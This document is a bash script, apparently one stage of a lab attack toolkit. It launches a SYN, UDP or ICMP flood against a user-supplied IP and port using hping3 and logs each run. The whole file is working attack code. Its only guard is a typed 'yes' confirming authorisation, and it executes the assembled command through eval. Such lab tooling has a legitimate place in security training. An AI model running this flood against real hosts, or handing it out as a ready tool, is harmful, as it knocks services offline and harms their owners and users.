#!/bin/bash

# ── Global Variables ──
TARGET_IP=""          # IP of the target Windows machine
LOG_FILE=""           # Path to the session log file
OUTPUT_DIR=""         # Directory to save output files
ATTACK_OUTPUT_FILE="" # Path to the attack parameters output file

ddos_attack() {
    {
        echo ""
        echo "========================================"
        echo "  [*] STAGE 3G: DDoS Attack (hping3)"
        echo "========================================"
        echo ""
    } | tee -a "$LOG_FILE"

    local TARGET_IP      # Target IP address
    local TARGET_PORT    # Target port to flood
    local PACKET_COUNT   # How many packets to send
    local ATTACK_TYPE    # SYN, UDP, or ICMP flood
    local WAIT_TIME      # Milliseconds between packets (0 = fastest)
    local CONFIRMATION   # User's authorisation confirmation
    local HPING_CMD      # Final hping3 command string (built dynamically)
    local START_TIME     # Unix timestamp when attack begins
    local END_TIME       # Unix timestamp when attack ends
    local DURATION       # Total attack duration in seconds

    # Step 1: Authorisation Warning
    echo "[!] WARNING: DDoS attacks are destructive and illegal without authorisation!"
    echo "[!] This tool should ONLY be used in authorised lab environments!"
    echo ""
    read -p "[?] Do you have authorisation to perform this attack? (yes/no): " CONFIRMATION

    if [[ "$CONFIRMATION" != "yes" ]]; then
        echo "[-] Attack cancelled. Returning to menu."
        return
    fi

    echo ""

    # Step 2: Get Target IP
    read -p "[?] Enter target IP (Windows Client): " TARGET_IP

    if [[ -z "$TARGET_IP" ]]; then
        echo "[!] No target IP provided. Returning to menu."
        return
    fi

    if ! [[ "$TARGET_IP" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        echo "[!] Invalid IP format. Returning to menu."
        return
    fi

    echo "[*] Target IP: $TARGET_IP"
    echo ""

    # Step 3: Check hping3 is installed
    echo "[*] Checking if hping3 is installed..."
    if ! command -v hping3 &> /dev/null; then
        echo "[!] hping3 not found."
        echo "[-] Install with: apt-get install hping3"
        echo "[!] Returning to menu."
        return
    fi

    echo "[+] hping3 found."
    echo ""

    # Step 4: Get Target Port
    read -p "[?] Enter target port (default: 80): " TARGET_PORT

    # Use default port 80 if user pressed Enter without input
    if [[ -z "$TARGET_PORT" ]]; then
        TARGET_PORT="80"
    fi

    # Validate port is a number between 1 and 65535
    if ! [[ "$TARGET_PORT" =~ ^[0-9]+$ ]] || [[ "$TARGET_PORT" -lt 1 ]] || [[ "$TARGET_PORT" -gt 65535 ]]; then
        echo "[!] Invalid port number. Using default port 80."
        TARGET_PORT="80"
    fi

    echo "[*] Target Port: $TARGET_PORT"
    echo ""

    # Step 5: Select Attack Type
    echo "[?] Select attack type:"
    echo "    1) SYN Flood  - Sends TCP SYN packets, exhausts connection table"
    echo "    2) UDP Flood  - Sends UDP packets, consumes bandwidth and CPU"
    echo "    3) ICMP Flood - Sends ICMP ping requests, consumes bandwidth"
    read -p "[?] Enter choice (1, 2, or 3): " ATTACK_CHOICE

    case "$ATTACK_CHOICE" in
        1) ATTACK_TYPE="SYN"  ;;
        2) ATTACK_TYPE="UDP"  ;;
        3) ATTACK_TYPE="ICMP" ;;
        *)
            echo "[!] Invalid choice. Using default SYN flood."
            ATTACK_TYPE="SYN"
            ;;
    esac

    echo "[*] Attack Type: $ATTACK_TYPE Flood"
    echo ""

    # Step 6: Get Packet Count
    read -p "[?] Enter number of packets to send (default: 1000): " PACKET_COUNT

    if [[ -z "$PACKET_COUNT" ]]; then
        PACKET_COUNT="1000"
    fi

    # Validate packet count is a positive integer
    if ! [[ "$PACKET_COUNT" =~ ^[0-9]+$ ]]; then
        echo "[!] Invalid packet count. Using default 1000."
        PACKET_COUNT="1000"
    fi

    echo "[*] Packet Count: $PACKET_COUNT"
    echo ""

    # Step 7: Get Wait Time Between Packets
    read -p "[?] Wait time between packets in ms (default: 0 = maximum speed): " WAIT_TIME

    if [[ -z "$WAIT_TIME" ]]; then
        WAIT_TIME="0"
    fi

    # Validate wait time is a non-negative integer
    if ! [[ "$WAIT_TIME" =~ ^[0-9]+$ ]]; then
        echo "[!] Invalid wait time. Using default 0."
        WAIT_TIME="0"
    fi

    # Step 8: Create Output File
    ATTACK_OUTPUT_FILE="$OUTPUT_DIR/ddos_${TARGET_IP}_$(date +"%Y%m%d_%H%M%S").txt"

    # Step 9: Pre-launch Warning
    echo ""
    echo "[!] Launching attack in 5 seconds... Press Ctrl+C to cancel."
    echo "[!] To stop the attack mid-way, press Ctrl+C during execution."
    sleep 5

    echo ""
    echo "[*] Launching $ATTACK_TYPE flood attack against $TARGET_IP:$TARGET_PORT..."
    echo "[*] DDoS Attack Started - Type: $ATTACK_TYPE Flood" | tee -a "$LOG_FILE"

    # Step 10: Write Attack Parameters to Output File
    {
        echo "=== DDoS Attack Parameters ==="
        echo "Target IP:    $TARGET_IP"
        echo "Target Port:  $TARGET_PORT"
        echo "Attack Type:  $ATTACK_TYPE Flood"
        echo "Packet Count: $PACKET_COUNT"
        echo "Wait Time:    ${WAIT_TIME}ms"
        echo "Start Time:   $(date +"%Y-%m-%d %H:%M:%S")"
        echo ""
        echo "=== Attack Output ==="
    } | tee -a "$ATTACK_OUTPUT_FILE"

    # Record start time for duration calculation
    START_TIME=$(date +%s)

    # Step 11: Build and Execute hping3 Command

    case "$ATTACK_TYPE" in
        SYN)
            HPING_CMD="hping3 -S -p $TARGET_PORT -c $PACKET_COUNT"

            if [[ "$WAIT_TIME" -gt 0 ]]; then
                HPING_CMD="$HPING_CMD -i $WAIT_TIME"
            else
                HPING_CMD="$HPING_CMD -i u10000"
            fi
            ;;
        UDP)
            HPING_CMD="hping3 --udp -p $TARGET_PORT -c $PACKET_COUNT"

            if [[ "$WAIT_TIME" -gt 0 ]]; then
                HPING_CMD="$HPING_CMD -i $WAIT_TIME"
            else
                HPING_CMD="$HPING_CMD -i u10000"
            fi
            ;;
        ICMP)
            HPING_CMD="hping3 -1 -c $PACKET_COUNT"

            if [[ "$WAIT_TIME" -gt 0 ]]; then
                HPING_CMD="$HPING_CMD -i $WAIT_TIME"
            else
                HPING_CMD="$HPING_CMD -i u10000"
            fi
            ;;
    esac

    # Append the target IP to the end of the command
    HPING_CMD="$HPING_CMD $TARGET_IP"

    # Log the exact command being run for transparency
    echo "[*] Running: $HPING_CMD" | tee -a "$ATTACK_OUTPUT_FILE"
    echo ""

    # Execute the hping3 command
    if eval "$HPING_CMD" 2>&1 | tee -a "$ATTACK_OUTPUT_FILE"; then
        # Record end time and calculate duration
        END_TIME=$(date +%s)
        DURATION=$((END_TIME - START_TIME))

        echo ""
        echo "[+] Attack completed successfully." | tee -a "$LOG_FILE"
        echo "[*] Duration: ${DURATION} seconds" | tee -a "$LOG_FILE"
    else
        echo "[!] Attack encountered an error. Target may be unreachable." | tee -a "$LOG_FILE"
    fi

    # Step 12: Append Summary to Log
    {
        echo ""
        echo "=== DDoS Attack Summary ==="
        echo "Target IP:    $TARGET_IP"
        echo "Target Port:  $TARGET_PORT"
        echo "Attack Type:  $ATTACK_TYPE Flood"
        echo "Packets Sent: $PACKET_COUNT"
        echo "End Time:     $(date +"%Y-%m-%d %H:%M:%S")"
        echo "Output File:  $ATTACK_OUTPUT_FILE"
        echo ""
    } >> "$LOG_FILE"

    echo ""
    echo "[+] Attack log saved to: $ATTACK_OUTPUT_FILE" | tee -a "$LOG_FILE"
    echo "" | tee -a "$LOG_FILE"
}

if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    OUTPUT_DIR="${OUTPUT_DIR:-.}"
    LOG_FILE="${LOG_FILE:-/tmp/stage_3g_test.log}"

    echo "[*] Stage 3G DDoS Attack - Standalone Test Mode"
    echo "[*] Log file: $LOG_FILE"
    echo "[*] Output directory: $OUTPUT_DIR"
    echo ""

    ddos_attack
fi
